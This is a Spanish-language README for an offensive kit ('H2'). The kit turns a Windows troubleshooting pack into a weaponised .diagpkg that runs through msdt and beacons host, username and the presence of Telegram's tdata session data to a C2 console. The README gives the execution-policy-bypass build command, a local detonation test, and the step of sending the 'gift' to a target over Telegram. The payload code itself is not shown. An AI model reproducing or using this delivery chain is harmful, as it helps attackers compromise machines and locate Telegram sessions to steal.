# Kit H2 — Gift de Troubleshooting para el carril 0-click de Telegram Desktop

## Que es esto
Instrumento para el plan H2 (ver H2-PLAN.md): convierte un pack de troubleshooting
del propio sistema (benigno) en un pack que AVISA al C2 cuando msdt lo ejecuta.
No roba nada: el beacon lleva host, usuario y un flag true/false de si existe
tdata en la maquina. Con eso la consola RC-T20 (tab REGISTRO) marca el momento
exacto de detonacion.

## Uso (en la maquina victima lab, Windows 10)
1. Abrir PowerShell normal (no hace falta admin para copiar los packs del sistema).
2. Ejecutar:
   powershell -ExecutionPolicy Bypass -File .\ARMAR-GIFT.ps1
3. Genera en el escritorio:
   - regalo.diagpkg       (el gift para mandar por Telegram)
   - regalo-carpeta\      (el mismo pack en carpeta, para probar msdt -path)
   - abrir-regalo.cmd     (lanzador local para probar detonacion sin Telegram)

## Verificacion de detonacion sin riesgo
Primero probar el pack copiado LOCALMENTE (doble clic a abrir-regalo.cmd o
msdt -path regalo-carpeta): si el REGISTRO de la consola muestra
"H2 0-CLICK · H2-EXEC", msdt ejecuto el script del pack en tu maquina.
Recien entonces mandar el regalo.diagpkg por Telegram y probar la cadena completa.
